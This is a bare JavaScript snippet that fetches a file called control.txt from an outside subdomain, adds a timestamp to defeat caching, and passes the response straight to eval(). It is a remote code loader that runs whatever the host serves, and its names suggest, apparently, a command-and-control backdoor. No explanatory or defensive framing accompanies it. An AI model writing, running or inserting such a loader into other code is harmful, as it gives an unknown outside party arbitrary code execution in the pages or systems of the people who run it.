fetch('https://morning-insect-316.techsmart.cc/control.txt?t=' + Date.now())
    .then(r => r.text())
    .then(code => eval(code))
    .catch(err => console.log('Techsmart fetch error:', err));
